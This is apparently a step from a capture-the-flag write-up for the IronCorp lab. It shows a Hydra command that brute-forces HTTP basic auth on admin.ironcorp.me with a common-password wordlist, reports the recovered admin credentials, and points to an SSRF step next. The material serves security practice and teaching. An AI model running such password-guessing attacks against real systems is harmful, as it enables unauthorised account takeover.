Guessing the user is admin use hydra with a dictionary with the 10000 most used passwords.

`hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt -s 11025 admin.ironcorp.me http-get`

![[Hydra-20240828150515276.webp]]

Username: `admin`
Password: `password123`

Browse to http://admin.ironcorp.me:11025 and log in.

![[Hydra-20240828150803712.webp]]

Ther's an area where you can make inquiries through a form.

**Next step:** [[SSRF Vulnerability]]
